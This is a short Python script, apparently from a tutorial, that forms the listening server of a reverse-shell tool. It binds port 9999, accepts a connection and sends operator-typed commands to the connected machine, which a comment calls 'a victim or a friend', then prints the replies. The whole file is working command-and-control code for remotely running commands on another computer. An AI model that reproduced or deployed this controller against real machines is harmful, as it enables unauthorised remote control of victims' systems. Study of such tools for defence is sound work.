import socket
import sys # used to implement terminal features in python

# Create a socket [connect two computers]
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Establish connections with client (socket must be listening)
def socket_accept() :
    # [1. object of the connection]
    # [2. list containing IP address and port]
    c, addr = s.accept()
    print("Connection has been established " + " IP : " + addr[0] + " Port : " + str(addr[1]))
    send_command(c)
    c.close()

# Send command to a client, victim or a friend
def send_command(c):
    while True:
        cmd = input()
        if cmd == 'quit':
            c.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            c.send(str.encode(cmd))
            client_response = str(c.recv(1024),"utf-8")
            print(client_response, end="")

def main() :
    create_socket()
    bind_socket()
    socket_accept()

main()
